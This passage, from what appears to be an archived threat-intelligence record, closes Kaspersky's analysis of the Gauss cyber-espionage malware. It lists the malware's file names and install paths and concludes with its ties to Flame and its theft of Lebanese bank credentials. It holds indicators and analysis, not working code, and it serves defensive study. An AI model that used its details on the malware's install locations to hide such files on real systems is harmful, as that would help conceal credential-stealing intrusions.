drive|\n|md.bak|%temp%|\n|s61cs3.dat|%systemroot%\\Temp\\|\n|s61cs3.dat|%temp%|\n|~ZM6AD3.tmp|%windir%\\temp|\n|browser.js|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4- 7b2443f89f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n\n\n-----\n\n|browser.xul|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|---|---|\n|fileio.js|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|chrome.manifest|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|lppd.dat|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|install.rdf|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|rssf.dat|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|lfm.dat|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|mppd.dat|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|pddp.dat|%AppData%\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\\Mozilla\\Firefox\\Profiles\\*\\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}|\n|pldnrfn.ttf|%SystemRoot%\\fonts\\|\n\n\n-----\n\n### Conclusion\n\nGauss is the most recent development from the pool of cyber-espionage projects that includes Stuxnet, Flame and Duqu. It\n\nwas most likely created in mid-2011 and deployed for the first time in August-September 2011.\n\nIts geographical distribution is unique; the majority of infections were found in Lebanon, Palestine and Israel. One of the\n\nmodules from Jan 2012 contains the path “c:\\documents and settings\\flamer\\desktop\\gauss_white_1”. The “flamer” in the\n\npath above is the Windows username that compiled the project. Given the focus on Lebanon, the “white” version identifier\n\ncan probably be explained as following: “the name Lebanon comes from the Semitic root LBN, meaning “white”, likely a\n\nreference to the snow-capped Mount Lebanon.” (Wikipedia)\n\nCode references and encryption subroutines, together with the Command and Control infrastructure make us believe Gauss\n\nwas created by the same “factory” which produced Flame. This indicates it is most likely a nation-state sponsored operation.\n\nBetween Gauss’ functions, the “Winshell.ocx” module which gives the name to the malware as “Gauss”, steals credentials\n\nrequired to access online banking accounts for several Lebanese banks – including the Bank of Beirut, Byblos Bank and\n\nFransabank. This is the first publicly known nation-state sponsored banking Trojan.\n\nAnother feature which makes Gauss unique is its encrypted payload, which we haven’t been able to unlock. The payload is\n\nrun by infected USB sticks and is designed to surgically target a certain system (or systems) which have a specific program\n\ninstalled. One can only speculate on the purpose of this mysterious payload.\n\nThe discovery of Gauss indicates that there are probably many other related cyber-espionage malware in operation.\n\nThe current tensions in the Middle East are just signs of the intensity of these ongoing cyber-war and cyber-espionage\n\ncampaigns.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf",
        "https://app.box.com/s/y0wmp82qdqivrx4x21nfj5miod1tjuf1",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2012/2012.08.09.Gauss/kaspersky-lab-gauss.pdf"
    ],
    "report_names": [
        "kaspersky-lab-gauss.pdf",
        "kaspersky-lab-gauss"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1344536081,
    "ts_modification_date": 1344536083,
    "files": {
        "pdf": "https://archive.orkl.eu/4c9c37199b1e1da37d0dae56f7a6469e0b0a4c6e.pdf",
        "text": "https://archive.orkl.eu/4c9c37199b1e1da37d0dae56f7a6469e0b0a4c6e.txt",
        "img": "https://archive.orkl.eu/4c9c37199b1e1da37d0dae56f7a6469e0b0a4c6e.jpg"
    }
}